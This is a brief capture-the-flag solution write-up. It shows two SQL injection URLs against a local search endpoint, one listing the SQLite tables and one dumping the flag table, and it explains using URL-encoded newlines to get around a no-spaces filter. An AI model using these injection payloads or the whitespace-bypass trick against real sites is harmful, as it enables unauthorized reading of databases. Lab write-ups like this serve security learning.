First:
```
http://localhost:5000/search/keirwgnph';SELECT%0Aname%0AFROM%0Asqlite_master%0AWHERE%0Atype='table'-- 
```

Replace localhost:5000 with the server, note the trailing space

The SQL injection needs to have no spaces in it, so URL newlines (%0A) are used instead of spaces (%20) for whitespace characters. other whitespace works as well (typing it in the URL is so much easier than typing it the actual site)
This selects the various tables, so that you know where the flag is.

Then:
```
http://localhost:5000/search/a4toi3rgo3ith';SELECT%0A*%0AFROM%0Aflag;-- 
```

(again, replacing the url appropriately)

This gets the flag from the flag table, which you know exists after running the first injection.